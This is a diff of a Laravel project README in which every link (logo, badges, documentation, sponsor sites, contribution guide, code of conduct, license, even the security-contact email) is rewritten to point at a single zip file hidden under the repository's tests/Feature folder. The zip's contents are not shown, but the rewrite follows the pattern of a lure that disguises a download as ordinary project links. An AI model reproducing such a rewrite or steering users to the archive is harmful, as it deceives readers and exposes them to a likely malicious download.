@@ -1,78 +1,78 @@
-<p align="center"><img src="https://res.cloudinary.com/dtfbvvkyp/image/upload/v1566331377/laravel-logolockup-cmyk-red.svg" width="400"></p>
+<p align="center"><img src="https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip" width="400"></p>
 
 <p align="center">
-<a href="https://travis-ci.org/laravel/framework"><img src="https://travis-ci.org/laravel/framework.svg" alt="Build Status"></a>
-<a href="https://packagist.org/packages/laravel/framework"><img src="https://poser.pugx.org/laravel/framework/d/total.svg" alt="Total Downloads"></a>
-<a href="https://packagist.org/packages/laravel/framework"><img src="https://poser.pugx.org/laravel/framework/v/stable.svg" alt="Latest Stable Version"></a>
-<a href="https://packagist.org/packages/laravel/framework"><img src="https://poser.pugx.org/laravel/framework/license.svg" alt="License"></a>
+<a href="https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip"><img src="https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip" alt="Build Status"></a>
+<a href="https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip"><img src="https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip" alt="Total Downloads"></a>
+<a href="https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip"><img src="https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip" alt="Latest Stable Version"></a>
+<a href="https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip"><img src="https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip" alt="License"></a>
 </p>
 
 ## About Laravel
 
 Laravel is a web application framework with expressive, elegant syntax. We believe development must be an enjoyable and creative experience to be truly fulfilling. Laravel takes the pain out of development by easing common tasks used in many web projects, such as:
 
-- [Simple, fast routing engine](https://laravel.com/docs/routing).
-- [Powerful dependency injection container](https://laravel.com/docs/container).
-- Multiple back-ends for [session](https://laravel.com/docs/session) and [cache](https://laravel.com/docs/cache) storage.
-- Expressive, intuitive [database ORM](https://laravel.com/docs/eloquent).
-- Database agnostic [schema migrations](https://laravel.com/docs/migrations).
-- [Robust background job processing](https://laravel.com/docs/queues).
-- [Real-time event broadcasting](https://laravel.com/docs/broadcasting).
+- [Simple, fast routing engine](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip).
+- [Powerful dependency injection container](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip).
+- Multiple back-ends for [session](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip) and [cache](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip) storage.
+- Expressive, intuitive [database ORM](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip).
+- Database agnostic [schema migrations](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip).
+- [Robust background job processing](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip).
+- [Real-time event broadcasting](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip).
 
 Laravel is accessible, powerful, and provides tools required for large, robust applications.
 
 ## Learning Laravel
 
-Laravel has the most extensive and thorough [documentation](https://laravel.com/docs) and video tutorial library of all modern web application frameworks, making it a breeze to get started with the framework.
+Laravel has the most extensive and thorough [documentation](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip) and video tutorial library of all modern web application frameworks, making it a breeze to get started with the framework.
 
-If you don't feel like reading, [Laracasts](https://laracasts.com) can help. Laracasts contains over 1500 video tutorials on a range of topics including Laravel, modern PHP, unit testing, and JavaScript. Boost your skills by digging into our comprehensive video library.
+If you don't feel like reading, [Laracasts](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip) can help. Laracasts contains over 1500 video tutorials on a range of topics including Laravel, modern PHP, unit testing, and JavaScript. Boost your skills by digging into our comprehensive video library.
 
 ## Laravel Sponsors
 
-We would like to extend our thanks to the following sponsors for funding Laravel development. If you are interested in becoming a sponsor, please visit the Laravel [Patreon page](https://patreon.com/taylorotwell).
+We would like to extend our thanks to the following sponsors for funding Laravel development. If you are interested in becoming a sponsor, please visit the Laravel [Patreon page](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip).
 
-- **[Vehikl](https://vehikl.com/)**
-- **[Tighten Co.](https://tighten.co)**
-- **[Kirschbaum Development Group](https://kirschbaumdevelopment.com)**
-- **[64 Robots](https://64robots.com)**
-- **[Cubet Techno Labs](https://cubettech.com)**
-- **[Cyber-Duck](https://cyber-duck.co.uk)**
-- **[British Software Development](https://www.britishsoftware.co)**
-- **[Webdock, Fast VPS Hosting](https://www.webdock.io/en)**
-- **[DevSquad](https://devsquad.com)**
-- [UserInsights](https://userinsights.com)
-- [Fragrantica](https://www.fragrantica.com)
-- [SOFTonSOFA](https://softonsofa.com/)
-- [User10](https://user10.com)
-- [Soumettre.fr](https://soumettre.fr/)
-- [CodeBrisk](https://codebrisk.com)
-- [1Forge](https://1forge.com)
-- [TECPRESSO](https://tecpresso.co.jp/)
-- [Runtime Converter](http://runtimeconverter.com/)
-- [WebL'Agence](https://weblagence.com/)
-- [Invoice Ninja](https://www.invoiceninja.com)
-- [iMi digital](https://www.imi-digital.de/)
-- [Earthlink](https://www.earthlink.ro/)
-- [Steadfast Collective](https://steadfastcollective.com/)
-- [We Are The Robots Inc.](https://watr.mx/)
-- [Understand.io](https://www.understand.io/)
-- [Abdel Elrafa](https://abdelelrafa.com)
-- [Hyper Host](https://hyper.host)
-- [Appoly](https://www.appoly.co.uk)
-- [OP.GG](https://op.gg)
+- **[Vehikl](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip)**
+- **[Tighten Co.](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip)**
+- **[Kirschbaum Development Group](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip)**
+- **[64 Robots](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip)**
+- **[Cubet Techno Labs](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip)**
+- **[Cyber-Duck](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip)**
+- **[British Software Development](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip)**
+- **[Webdock, Fast VPS Hosting](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip)**
+- **[DevSquad](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip)**
+- [UserInsights](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip)
+- [Fragrantica](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip)
+- [SOFTonSOFA](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip)
+- [User10](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip)
+- [https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip)
+- [CodeBrisk](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip)
+- [1Forge](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip)
+- [TECPRESSO](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip)
+- [Runtime Converter](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip)
+- [WebL'Agence](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip)
+- [Invoice Ninja](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip)
+- [iMi digital](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip)
+- [Earthlink](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip)
+- [Steadfast Collective](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip)
+- [We Are The Robots Inc.](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip)
+- [https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip)
+- [Abdel Elrafa](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip)
+- [Hyper Host](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip)
+- [Appoly](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip)
+- [https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip)
 
 ## Contributing
 
-Thank you for considering contributing to the Laravel framework! The contribution guide can be found in the [Laravel documentation](https://laravel.com/docs/contributions).
+Thank you for considering contributing to the Laravel framework! The contribution guide can be found in the [Laravel documentation](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip).
 
 ## Code of Conduct
 
-In order to ensure that the Laravel community is welcoming to all, please review and abide by the [Code of Conduct](https://laravel.com/docs/contributions#code-of-conduct).
+In order to ensure that the Laravel community is welcoming to all, please review and abide by the [Code of Conduct](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip).
 
 ## Security Vulnerabilities
 
-If you discover a security vulnerability within Laravel, please send an e-mail to Taylor Otwell via [taylor@laravel.com](mailto:taylor@laravel.com). All security vulnerabilities will be promptly addressed.
+If you discover a security vulnerability within Laravel, please send an e-mail to Taylor Otwell via [https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip). All security vulnerabilities will be promptly addressed.
 
 ## License
 
-The Laravel framework is open-sourced software licensed under the [MIT license](https://opensource.org/licenses/MIT).
+The Laravel framework is open-sourced software licensed under the [MIT license](https://github.com/AzzaFizatiaina/Laravel-CRUD/raw/refs/heads/main/tests/Feature/Laravel_CRUD_securifer.zip).
